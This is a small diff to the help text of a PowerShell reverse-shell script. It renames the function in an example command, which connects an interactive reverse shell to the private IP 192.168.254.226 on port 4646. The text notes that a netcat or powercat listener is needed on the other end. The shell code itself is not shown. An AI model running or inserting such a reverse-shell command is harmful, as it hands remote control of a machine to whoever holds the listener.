@@ -12,7 +12,7 @@ The port to connect to when using the -Reverse switch.
 
 
 .EXAMPLE
-PS > GetShellSSL -Reverse -IPAddress 192.168.254.226 -Port 4646
+PS > GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646
 
 Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
 the given IP and port. 
